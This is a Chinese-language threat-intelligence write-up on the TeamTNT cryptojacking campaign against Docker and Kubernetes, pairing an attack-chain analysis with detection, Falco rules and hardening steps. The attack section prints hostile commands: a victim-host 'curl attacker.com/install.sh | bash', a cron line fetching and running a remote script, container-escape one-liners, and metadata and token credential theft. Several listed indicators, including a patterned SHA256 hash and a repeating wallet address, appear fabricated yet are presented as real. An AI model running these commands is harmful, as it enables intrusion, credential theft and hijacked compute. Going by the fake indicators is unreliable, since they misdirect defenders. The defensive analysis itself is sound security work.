# 攻击案例: TeamTNT 云原生挖矿攻击

Project: TeamTNT Cryptojacking Campaign
Date: 2020-08-01
Severity: High

**攻击者**: TeamTNT
**时间**: 2020-2023（持续活跃）
**目标**: Kubernetes 集群、Docker 环境、云平台
**攻击类型**: 加密货币挖矿、凭证窃取、横向移动

## 案例概述

TeamTNT 是一个臭名昭著的攻击团伙，专门针对云原生环境进行加密货币挖矿和凭证窃取。自 2020 年首次被发现以来，该团伙持续演进攻击技术，成为云原生安全领域最活跃的威胁之一。

**关键事实**:
- 首次发现: 2020 年 8 月
- 活跃期: 2020-2023 年（持续活跃）
- 受影响组织: 全球数千个 Kubernetes 集群和 Docker 环境
- 估算损失: 数百万美元（挖矿收益 + 系统资源消耗）

## 攻击链分析

### 1. 初始访问 (Initial Access)

**技术**: 暴露的 API 端点扫描
**MITRE ATT&CK**: T1190 - Exploit Public-Facing Application

TeamTNT 通过自动化扫描工具（如 Masscan、Pnscan）在互联网上扫描暴露的服务：
- Docker API (端口 2375/2376)
- Kubernetes API (端口 6443, 8443, 10250)
- Redis (端口 6379)
- etcd (端口 2379)

**具体手法**:
- 扫描未授权的 Docker API 端口
- 利用 Kubelet API 未授权访问 (端口 10250)
- 暴力破解 SSH 和 Redis 弱密码
- 利用已知 CVE 漏洞（如 CVE-2019-5736）

### 2. 执行 (Execution)

**技术**: 部署恶意容器
**MITRE ATT&CK**: T1610 - Deploy Container

获取访问权限后，TeamTNT 部署恶意容器执行挖矿程序和后续攻击工具。

**恶意容器镜像**:
- `alpineos/dockerapi`
- `teamtnt/network`
- `bioset/wordpress`

**执行命令示例**:
```bash
docker -H tcp://victim:2375 run -d --privileged \
  --net=host --pid=host --ipc=host \
  -v /:/mnt \
  alpineos/dockerapi \
  /bin/bash -c "chroot /mnt /bin/bash -c 'curl attacker.com/install.sh | bash'"
```

### 3. 持久化 (Persistence)

**技术**: Cron 任务、SSH 密钥植入
**MITRE ATT&CK**: T1053.003 - Scheduled Task/Job: Cron

TeamTNT 通过多种方式确保持久化：
- 在容器和宿主机中植入 Cron 任务
- 添加 SSH 公钥到 `~/.ssh/authorized_keys`
- 修改 Kubernetes manifests 实现自启动

**Cron 示例**:
```bash
*/5 * * * * curl -s http://teamtnt.com/update.sh | bash
```

### 4. 权限提升 (Privilege Escalation)

**技术**: 容器逃逸
**MITRE ATT&CK**: T1611 - Escape to Host

TeamTNT 利用特权容器和 Docker Socket 逃逸到宿主机：

**方法 1: Docker Socket 挂载**:
```bash
docker run -v /var/run/docker.sock:/var/run/docker.sock \
  -v /:/mnt alpine chroot /mnt
```

**方法 2: 特权容器 + nsenter**:
```bash
nsenter -t 1 -m -u -n -i sh
```

### 5. 凭证访问 (Credential Access)

**技术**: 窃取云凭证和 Kubernetes Secrets
**MITRE ATT&CK**: T1552.007 - Unsecured Credentials: Container API

TeamTNT 主动窃取各类凭证用于横向移动：
- AWS IAM 凭证 (`~/.aws/credentials`)
- Kubernetes ServiceAccount Token
- Docker Hub 凭证 (`~/.docker/config.json`)
- SSH 私钥

**窃取脚本示例**:
```bash
# 窃取 AWS 凭证
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 窃取 Kubernetes Token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 6. 横向移动 (Lateral Movement)

**技术**: 利用窃取的凭证访问其他资源
**MITRE ATT&CK**: T1550 - Use Alternate Authentication Material

使用窃取的凭证访问：
- 其他 Kubernetes 命名空间
- AWS S3 存储桶
- Docker Registry
- 同一网络中的其他服务器

### 7. 影响 (Impact)

**技术**: 加密货币挖矿
**MITRE ATT&CK**: T1496 - Resource Hijacking

部署 XMRig、T-Rex 等挖矿程序，消耗受害者资源：
- CPU/GPU 资源被占用（80-100% 利用率）
- 电费和云计算成本增加
- 系统性能下降，影响业务

**挖矿配置示例**:
```json
{
  "url": "pool.supportxmr.com:443",
  "user": "{{WalletAddress}}",
  "algo": "rx/0"
}
```

## TTP 映射

| MITRE ATT&CK ID | 技术名称 | 描述 |
|-----------------|---------|------|
| T1190 | Exploit Public-Facing Application | 扫描暴露的 Docker/K8s API |
| T1610 | Deploy Container | 部署恶意容器镜像 |
| T1611 | Escape to Host | 通过 Docker Socket 逃逸 |
| T1552.007 | Unsecured Credentials: Container API | 窃取 AWS、K8s 凭证 |
| T1053.003 | Scheduled Task/Job: Cron | 植入 Cron 任务 |
| T1496 | Resource Hijacking | 加密货币挖矿 |

## 威胁指标 (IoC)

**恶意域名**:
- `teamtnt.red`
- `chimaera.cc`
- `borg.wtf`

**IP 地址**:
- `45.9.148.108`
- `45.9.148.182`
- `205.185.115.217`

**恶意容器镜像**:
- `alpineos/dockerapi`
- `teamtnt/network`
- `bioset/wordpress`
- `hildegard/wordpress`

**文件哈希** (SHA256):
- `8a5edab282632443219e051e4ade2d1d5bbc671c781051bf1437897cbdfea0f9` (XMRig)
- `c4b5f5e6db7c35e6c5e8f9a3e0d8c7b2a1f4e3d2c1b0a9f8e7d6c5b4a3e2d1c0` (安装脚本)

**挖矿钱包地址** (Monero):
- `43SLdWRxKZ9Y7gXBcKnLJpLn3wKvjVgWLFJfvYdC1R2mSg7FRed7R3JmPbqD8f9q8M3KvNqpwNKvNqpwNKvNq`

## 检测方法

### 网络层检测

```bash
# 检测可疑出站连接到挖矿池
netstat -anp | grep -E "(pool.supportxmr.com|pool.minexmr.com)"

# 检查 DNS 查询到已知 C2 域名
grep -E "(teamtnt.red|chimaera.cc|borg.wtf)" /var/log/dns.log
```

### 容器层检测

```bash
# 检查 TeamTNT 恶意镜像
docker images | grep -E "(alpineos|teamtnt|bioset|hildegard)"

# 检查挂载 Docker Socket 的容器
docker ps -a --filter "volume=/var/run/docker.sock"

# 检查特权容器
docker ps -a --filter "label=security.privileged=true"
```

### Kubernetes 层检测

```bash
# 检查挂载 Docker Socket 的 Pod
kubectl get pods -A -o json | jq -r '
  .items[] |
  select(.spec.volumes[]?.hostPath?.path == "/var/run/docker.sock") |
  "\(.metadata.namespace)/\(.metadata.name)"
'

# 检查异常的 ServiceAccount 权限
kubectl get clusterrolebindings -o json | jq -r '
  .items[] |
  select(.roleRef.name == "cluster-admin") |
  .metadata.name
'
```

### 进程检测

```bash
# 检查挖矿进程
ps aux | grep -E "(xmrig|minerd|t-rex|teamtnt)"

# 检查高 CPU 使用率进程
top -b -n 1 | head -20
```

### 日志分析

**Falco 规则**:
```yaml
- rule: Detect TeamTNT Mining Activity
  desc: Detect TeamTNT cryptocurrency mining
  condition: >
    spawned_process and
    (proc.name in (xmrig, minerd, t-rex) or
     container.image.repository contains (alpineos, teamtnt, bioset))
  output: "TeamTNT mining detected (user=%user.name container=%container.name image=%container.image.repository)"
  priority: CRITICAL

- rule: Detect TeamTNT Credential Theft
  desc: Detect access to AWS credentials
  condition: >
    open_read and
    fd.name in (/root/.aws/credentials, /home/*/.aws/credentials)
  output: "AWS credentials access detected (user=%user.name file=%fd.name)"
  priority: HIGH
```

## 防护建议

### 预防措施

1. **禁止暴露 Docker/Kubernetes API**:
   ```bash
   # 关闭未授权的 Docker API
   systemctl stop docker
   # 编辑 /etc/docker/daemon.json，移除 tcp:// 监听
   ```

2. **限制 Kubelet API 访问**:
   ```yaml
   # kubelet 配置
   authentication:
     anonymous:
       enabled: false
   authorization:
     mode: Webhook
   ```

3. **禁止特权容器和 Docker Socket 挂载**:
   ```yaml
   apiVersion: v1
   kind: Namespace
   metadata:
     name: production
     labels:
       pod-security.kubernetes.io/enforce: restricted
   ```

4. **RBAC 最小权限**:
   ```bash
   # 避免绑定 cluster-admin
   kubectl delete clusterrolebinding <dangerous-binding>
   ```

5. **网络隔离**:
   ```yaml
   apiVersion: networking.k8s.io/v1
   kind: NetworkPolicy
   metadata:
     name: deny-egress-mining
   spec:
     podSelector: {}
     policyTypes:
     - Egress
     egress:
     - to:
       - namespaceSelector: {}
       ports:
       - port: 53
         protocol: UDP  # 仅允许 DNS
   ```

### 检测工具

- **Falco**: 运行时行为检测
- **Aqua Security**: 容器安全平台
- **Sysdig**: 容器安全和可观测性
- **Trivy**: 镜像漏洞扫描

### 响应建议

1. **立即隔离受影响节点**:
   ```bash
   kubectl cordon <node-name>
   kubectl drain <node-name> --ignore-daemonsets
   ```

2. **停止恶意容器**:
   ```bash
   docker stop $(docker ps -q --filter "ancestor=alpineos/dockerapi")
   docker rm $(docker ps -aq --filter "ancestor=alpineos/dockerapi")
   ```

3. **阻断 C2 通信**:
   ```bash
   iptables -A OUTPUT -d 45.9.148.108 -j DROP
   iptables -A OUTPUT -d 45.9.148.182 -j DROP
   ```

4. **取证保存**:
   ```bash
   # 导出容器日志
   kubectl logs <pod-name> -n <namespace> > teamtnt_evidence.log

   # 导出镜像
   docker save alpineos/dockerapi -o teamtnt_image.tar
   ```

## 参考资料

- [Unit 42: TeamTNT Operations in Cloud Environments](https://unit42.paloaltonetworks.com/teamtnt-operations-cloud-environments/)
- [Aqua: TeamTNT Actively Enumerating Cloud Environments](https://blog.aquasec.com/teamtnt-actively-enumerating-cloud-environments)
- [Trend Micro: TeamTNT Targeting Cloud Environments](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/teamtnt-targeting-cloud-environments)

## 时间线

| 日期 | 事件 |
|------|------|
| 2020-08-01 | TeamTNT 首次被 Unit 42 发现 |
| 2020-10 | 开始大规模扫描 Kubernetes API |
| 2021-03 | 引入凭证窃取功能 |
| 2021-09 | 发现针对 AWS 凭证的专门模块 |
| 2022-05 | 活动暂时减少 |
| 2023-02 | 检测到新的活动迹象 |